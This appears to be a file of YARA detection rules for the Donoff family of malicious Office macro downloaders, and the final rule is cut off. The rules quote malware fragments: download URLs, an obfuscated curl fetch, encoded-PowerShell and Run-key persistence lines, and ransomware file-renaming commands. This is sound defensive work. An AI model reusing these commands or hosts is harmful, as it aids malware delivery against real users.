rule Trojan_O97M_Donoff_2147708549_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff"
        threat_id = "2147708549"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Kophy_Painted" ascii //weight: 1
        $x_1_2 = ".SetRequestHeader" ascii //weight: 1
        $x_1_3 = ".Open" ascii //weight: 1
        $x_1_4 = ".Send" ascii //weight: 1
        $x_1_5 = ".ResponseText" ascii //weight: 1
        $x_1_6 = ", 29, 55), _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_2147708549_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff"
        threat_id = "2147708549"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EnumSystemLanguageGroupsA" ascii //weight: 1
        $x_1_2 = "ThisDocument.Path" ascii //weight: 1
        $x_1_3 = "ActiveDocument.Bookmarks.Count" ascii //weight: 1
        $x_1_4 = "enterprise = boxlike - 195" ascii //weight: 1
        $x_1_5 = "francophobe = phellodendron(prolog)" ascii //weight: 1
        $x_1_6 = "clog(adeem + aware)" ascii //weight: 1
        $x_1_7 = "If tablecloth + acetaminophen" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_O97M_Donoff_PK_2147742162_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.PK"
        threat_id = "2147742162"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "TEMP$" ascii //weight: 1
        $x_10_2 = "\\resume.hta" ascii //weight: 10
        $x_1_3 = "ADODB.Stream$" ascii //weight: 1
        $x_10_4 = {68 74 74 70 73 3a 2f 2f 62 75 69 6c 64 2d 6d 79 2d 72 65 73 75 6d 65 2e 63 6f 6d 2f [0-51] 2e 68 74 61}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SB_2147742998_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SB!MSR"
        threat_id = "2147742998"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "1Normal.ThisDocument" ascii //weight: 2
        $x_5_2 = "= Application.StartupPath & \"\" & Nerop" ascii //weight: 5
        $x_5_3 = "= ActiveDocument.AttachedTemplate.Path & \"\\pp:br\"" ascii //weight: 5
        $x_1_4 = "Execute" ascii //weight: 1
        $x_1_5 = "Private Sub Document_Open()" ascii //weight: 1
        $x_1_6 = "power" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Trojan_O97M_Donoff_SC_2147743192_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SC!MSR"
        threat_id = "2147743192"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sheertttAob.Open" ascii //weight: 1
        $x_1_2 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_3 = "= file2savrsave & Rnd & \".jse\"" ascii //weight: 1
        $x_1_4 = "= Environ(\"USERPROFILE\")" ascii //weight: 1
        $x_1_5 = "FSO_CREATED.Write jsText4Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SD_2147743249_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SD!MSR"
        threat_id = "2147743249"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "17"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "ActiveDocument.AttachedTemplate.Path &" ascii //weight: 2
        $x_2_2 = "Application.StartupPath &" ascii //weight: 2
        $x_5_3 = {43 61 6c 6c 42 79 4e 61 6d 65 ?? 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 26 20 22 2e 22 20 26 20 [0-16] 29}  //weight: 5, accuracy: Low
        $x_1_4 = "Debug.Print" ascii //weight: 1
        $x_1_5 = "ActiveDocument.Content.Text" ascii //weight: 1
        $x_1_6 = "Private Sub Document_Open()" ascii //weight: 1
        $x_5_7 = "1Normal.ThisDocument" ascii //weight: 5
        $x_1_8 = "Execute" ascii //weight: 1
        $x_1_9 = "power" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 1 of ($x_2_*) and 5 of ($x_1_*))) or
            ((2 of ($x_5_*) and 2 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_O97M_Donoff_SE_2147743348_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SE!MSR"
        threat_id = "2147743348"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 42 79 4e 61 6d 65 20 43 6c 61 73 73 [0-2] 2e [0-16] 2c 20 22 [0-16] 22 20 26 20 22 [0-16] 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 22 [0-16] 2e 65 22 20 26 20 22 22 20 2b 20 22 78 65 22 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_2 = "ExecuteExcel4Macro \"MESSAGE(False," ascii //weight: 1
        $x_1_3 = "FCFB3D2A-A0FA-1068-A738-08002B3371B5" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SR_2147745759_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SR!MSR"
        threat_id = "2147745759"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_1_2 = {3d 20 22 4d 73 68 74 61 [0-6] 3a 2f 2f 66 65 6a 61 6c 63 6f 6e 73 74 72 75 63 6f 65 73 2e 63 6f 6d 2e 62 72 2f 77 69 6e 64 6f 77 73 2e 74 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "Shell (Var)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SF_2147745763_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SF!MSR"
        threat_id = "2147745763"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {54 65 72 20 3d [0-36] 22 5c 55 73 65 72 73 2e}  //weight: 1, accuracy: Low
        $x_1_2 = "Print #Ntooker" ascii //weight: 1
        $x_1_3 = "Close #Ntooker" ascii //weight: 1
        $x_1_4 = "Terookl Application.StartupPath" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SG_2147747871_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SG!MSR"
        threat_id = "2147747871"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "RyukReadMe.txt" ascii //weight: 3
        $x_1_2 = {6f 62 6a 2e 52 75 6e [0-32] 22 43 3a 2f 44 6f 63 75 6d 65 6e 74 73 20 61 6e 64 20 53 65 74 74 69 6e 67 73 2f 41 6c 6c 20 75 73 65 72 73 2f 44 65 73 6b 74 6f 70 2f [0-16] 2e 62 61 74}  //weight: 1, accuracy: Low
        $x_1_3 = "BatchFile.WriteLine (\"REN *.DOC *.TXT\")" ascii //weight: 1
        $x_1_4 = {2f 2e 64 63 63 20 73 65 6e 64 20 24 6e 69 63 6b 20 43 3a 5c 57 69 6e 64 6f 77 73 5c [0-16] 2e 64 6f 63}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_O97M_Donoff_SH_2147748668_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SH!MSR"
        threat_id = "2147748668"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "open -a Safari" ascii //weight: 1
        $x_1_2 = "Base64Decode(OriginalQS) & \"&uname=\" & URLEncode(GetMachineData(\"username\")) & \"&dname=\" & URLEncode(GetMachineData(\"fullname\")) & \"&cname=\" & URLEncode(GetMachineData(\"machine\")" ascii //weight: 1
        $x_1_3 = {53 68 65 6c 6c 45 78 65 63 75 74 65 28 [0-21] 2c 20 22 6e 65 74 22 2c 20 22 75 73 65 20 2a 20 22 20 26 20 55 52 4c 2c 20 22 25 77 69 6e 64 69 72 25 5c 73 79 73 74 65 6d 33 32 22 2c 20 76 62 48 69 64 65}  //weight: 1, accuracy: Low
        $x_1_4 = "http://Motobit.cz" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_GA_2147750001_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.GA!MSR"
        threat_id = "2147750001"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {2b 20 43 68 72 28 [0-16] 20 58 6f 72 20 [0-16] 29}  //weight: 2, accuracy: Low
        $x_2_2 = {3d 20 56 61 6c 28 22 26 48 22 20 26 20 28 4d 69 64 24 28 46 46 46 46 2c 20 28 32 20 2a 20 [0-16] 29 20 2d 20 31 2c 20 32 29 29 29}  //weight: 2, accuracy: Low
        $x_2_3 = {4d 69 64 28 [0-8] 2c 20 69 2c 20 31 29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 [0-8] 2c 20 69 2c 20 31 29 29 20 2d 20 6e 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_ST_2147751548_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.ST!MSR"
        threat_id = "2147751548"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "FrKonert = Application.StartupPath" ascii //weight: 1
        $x_1_2 = "TiRfol = FrKonert & \"\\\" & Me.Name & FiKervh & \".txttxttxt.\"" ascii //weight: 1
        $x_1_3 = "TiRfol = FiNerty(\"ex aplo are ar.e ax ae \")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_A_2147754212_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.A!MTB"
        threat_id = "2147754212"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 6f 72 20 [0-16] 20 54 6f 20 [0-5] 20 53 74 65 70 [0-20] 20 3d 20 [0-8] 20 2b 20 4d 69 64 28 [0-16] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {52 65 73 75 6d 65 20 4e 65 78 74 3a 20 20 20 20 57 53 63 72 69 70 74 2e 51 75 69 74 20 3d 20 22 22 20 26 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-5] 29 2e 52 75 6e 28 [0-16] 28 4a 6f 69 6e 28 5b [0-32] 29 29 2c 20 30 2c 20 46 61 6c 73 65 29 3a 20 44 65 62 75 67 2e 50 72 69 6e 74 20 57 53 63 72 69 70 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SBR_2147756473_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SBR!MSR"
        threat_id = "2147756473"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "C:\\Windows\\System32\\cer%u%.exe C:\\ProgramData\\1.exe" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SBR_2147756473_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SBR!MSR"
        threat_id = "2147756473"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Hertil.CreateTextFile(\"C:\\ProgramData\\OIUTFuy\", True)" ascii //weight: 1
        $x_1_2 = "Hertil.CreateTextFile(Trest.DefaultTargetFrame" ascii //weight: 1
        $x_1_3 = "a.WriteLine Lost.Droks" ascii //weight: 1
        $x_1_4 = "Application.Quit SaveChanges" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SBR_2147756473_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SBR!MSR"
        threat_id = "2147756473"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {62 61 63 2e [0-16] 3d 6c 3f 70 68 70 2e 70 32 33 69 30 6f 69 61 2f 35 38 6f 6c 30 32 65 77 2f 6d 6f 63 2e [0-16] 2f 2f 3a 70 74 74 68}  //weight: 3, accuracy: Low
        $x_3_2 = {63 6f 6d 2f 77 31 6b 62 73 37 71 66 66 77 72 33 67 35 6e 6e 2f 68 7a 31 37 30 34 69 38 6b 38 62 77 68 79 6f 31 2e 70 68 70 3f 6c 3d [0-16] 2e 63 61 62}  //weight: 3, accuracy: Low
        $x_2_3 = "(\"temp\") & \"\\default.tmp" ascii //weight: 2
        $x_2_4 = "Shell \"regsvr32.exe C:\\\\Users\\\\Public\\\\dest2.dll" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 1 of ($x_2_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule Trojan_O97M_Donoff_SBR_2147756473_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SBR!MSR"
        threat_id = "2147756473"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://gammasolutionsltd.com" ascii //weight: 1
        $x_1_2 = "http://www.boudheib.ae/dffbuhu" ascii //weight: 1
        $x_1_3 = "http://basementpublications.com/knupvmx" ascii //weight: 1
        $x_1_4 = "http://searchstory.in/necepsw" ascii //weight: 1
        $x_1_5 = "http://www.ultraaction.com.br/fcxiysytizlg" ascii //weight: 1
        $x_1_6 = "http://padgettconsultants.ca" ascii //weight: 1
        $x_2_7 = "URLDo" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_O97M_Donoff_BC_2147757765_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.BC!MTB"
        threat_id = "2147757765"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 4d 69 63 72 6f 73 6f 66 74 2e 57 22 0d 0a 20 20 20 20 [0-5] 20 3d 20 00 20 26 20 22 69 6e 64 6f 77 73 2e 41 22}  //weight: 1, accuracy: Low
        $x_1_2 = "= b64Decode(stage_1)" ascii //weight: 1
        $x_1_3 = "Set actCtx = CreateObject(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_ARC_2147759816_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.ARC!MTB"
        threat_id = "2147759816"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "VB_Name = \"C01_WH\"" ascii //weight: 1
        $x_1_2 = "Rem Call XXX_VbaRemove.DeleteVBA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SK_2147760199_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SK!MSR"
        threat_id = "2147760199"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "p,:,\\,j,v,a,q,b,j,f,\\,f,l,f,g,r,z,3,2,\\,z,f,u,g,n,.,r,k,r," ascii //weight: 1
        $x_1_2 = "P,:,\\,h,f,r,e,f,\\,c,h,o,y,v,p,\\,v,a,.,p,b,z," ascii //weight: 1
        $x_1_3 = "P,:,\\,h,f,r,e,f,\\,c,h,o,y,v,p,\\,v,a,.,u,g,z,y," ascii //weight: 1
        $x_1_4 = "If (x% > 64 And x% < 91) Or (x% > 96 And x% < 123)" ascii //weight: 1
        $x_1_5 = "y% = 658 - 645" ascii //weight: 1
        $x_1_6 = "x% = x% - y%" ascii //weight: 1
        $x_1_7 = "If x% < 97 And x% > 83 Then x% = x% + 26 Else If x% < 65 Then x% = x% + 26" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_PWC_2147775687_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.PWC!MTB"
        threat_id = "2147775687"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CHAR(104)&\"ttps://www.seyranikenger.com.tr/mensajeria_system.exe" ascii //weight: 1
        $x_1_2 = "C:\\\" & Char(80) & Char(82) & \"OGRAMDATA\\a.\"&CHAR(101)&\"xe\")" ascii //weight: 1
        $x_1_3 = "(\"ur\"&CHAR(108)&\"mon\",\"UR\"&CHAR(76)&\"Down\"&CHAR(108)&\"oadToFi\"&CHAR(108)&\"eA" ascii //weight: 1
        $x_1_4 = "JJCCJJ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SM_2147785338_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SM!MTB"
        threat_id = "2147785338"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "sd = Chr(df - 103)" ascii //weight: 5
        $x_1_2 = "sdgfds csda bfgj vdfsh 424 grtjuy vfdsjhy " ascii //weight: 1
        $x_1_3 = "WSCript.shell" ascii //weight: 1
        $x_1_4 = "//*[@unitPrice > 20]" ascii //weight: 1
        $x_1_5 = "safd \"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SM_2147785338_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SM!MTB"
        threat_id = "2147785338"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "NNUPUEJUWU.RegWrite('HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Google Chrome Crash Reporter', aikido() + '\\\\CrashReport.exe', 'REG_SZ');" ascii //weight: 1
        $x_1_2 = "CrashReport.eREPITxe'; s2file(aikido() + '\\\\' + kins.replace('REPIT','')," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_SM_2147785338_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.SM!MTB"
        threat_id = "2147785338"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "curl%CommonProgramW6432:~23,1%--sil%TEMP:~-3,1%n%APPDATA:~-10,-9% http%CommonProgramFiles(x86):~15,1%://tv-m%APPDATA:~-9,-8%rket.onlin%CommonProgramFiles:~-15,-14%/simp%TEMP:~-6,1%e.%TEMP:~-16,-15%ng --output \"\"%namex%\"\" --ssl-no-revoke\" & vbCrLf" ascii //weight: 1
        $x_1_2 = "CreateTextFile (temppath & \"\\UjdUhsbsjfU.txt\")" ascii //weight: 1
        $x_1_3 = "CreateObject(\"Wscript.Shell\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RM_2147793914_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RM!MTB"
        threat_id = "2147793914"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Run \"cscript.exe %appdata%\\www.txt //E:VBScript //NoLogo \" + \"%~f0\" + \" %*\", Chr(48)" ascii //weight: 1
        $x_1_2 = {3d 20 47 65 74 4f 62 6a 65 63 74 28 22 6e 65 77 3a [0-63] 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= Environ(\"USERPROFILE\") & \"\\AppData\\Roaming\\" ascii //weight: 1
        $x_1_4 = {2b 20 22 77 77 77 2e 70 73 31 22 0d 0a [0-7] 20 3d 20 [0-5] 20 2b 20 22 77 77 77 2e 74 78 74 22 0d 0a [0-5] 20 3d 20 22 22 0d 0a [0-10] 20 3d 20 22 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 5a 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RK_2147796447_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RK!MTB"
        threat_id = "2147796447"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Attribute VB_Name = \"clean\"" ascii //weight: 1
        $x_1_2 = "ShellExecute" ascii //weight: 1
        $x_1_3 = "GetObject(StrReverse(\"000045355444-E94A-EC11-972C-02690731:wen\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RK_2147796447_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RK!MTB"
        threat_id = "2147796447"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "s = s + \"She\" + \"ll\\v1.0\" + \"\\pow\" + \"ersh\" + \"ell.\" + \"exe\"" ascii //weight: 1
        $x_1_2 = "s = s + \" -win \" + \"1 -e\" + \"nc \"" ascii //weight: 1
        $x_1_3 = "s = s + \"/MI\" + \"N C:\\Wi\" + \"ndo\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_O97M_Donoff_RK_2147796447_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:O97M/Donoff.RK!MTB"
        threat_id = "2147796447"
        type = "Trojan"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
